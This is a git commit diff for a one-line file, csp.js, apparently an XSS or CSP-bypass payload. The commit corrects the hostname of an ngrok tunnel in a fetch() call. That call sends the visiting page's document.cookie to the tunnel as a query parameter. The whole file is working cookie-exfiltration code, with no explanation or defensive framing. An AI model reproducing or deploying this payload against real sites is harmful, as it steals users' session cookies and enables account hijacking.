ea1da08fb5cb0fed1f5548802d01c653813ddf6d
a-chernobrov <108285225+a-chernobrov@users.noreply.github.com>
2025-01-14 12:14:38 +0200

    Update csp.js

--- csp.js
+++ csp.js
@@ -1,1 +1,1 @@
-fetch('https://3fbc-2a02-2f0e-5115-9900-1fea-2a66-cd75-dd36.ngrok-free?c=' + document.cookie) 
+fetch('https://3fbc-2a02-2f0e-5115-9900-1fea-2a66-cd75-dd36.ngrok-free.app?c=' + document.cookie) 
